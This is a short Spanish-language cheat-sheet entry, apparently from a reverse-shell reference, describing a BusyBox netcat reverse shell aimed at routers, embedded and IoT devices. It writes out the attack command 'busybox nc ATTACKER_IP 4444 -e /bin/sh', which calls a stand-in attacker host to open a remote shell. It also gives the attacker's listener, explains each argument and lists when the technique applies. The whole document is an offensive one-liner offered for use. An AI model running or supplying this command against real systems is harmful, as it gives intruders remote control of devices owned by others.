# Netcat Reverse Shell — BusyBox

## Descripción

BusyBox incluye una versión ligera de Netcat utilizada en sistemas embebidos y dispositivos IoT.

---

# Comando

```bash
busybox nc ATTACKER_IP 4444 -e /bin/sh
```

---

# Listener

```bash
nc -lvnp 4444
```

---

# Requisitos

* BusyBox instalado
* netcat disponible dentro de BusyBox

---

# Explicación

```
busybox nc     → ejecuta netcat de BusyBox
ATTACKER_IP    → IP atacante
4444           → puerto
-e /bin/sh     → ejecuta shell
```

---

# Cuándo usarlo

* dispositivos embebidos
* routers
* sistemas IoT

---

# Limitaciones

* depende de BusyBox
* algunas builds eliminan `-e`
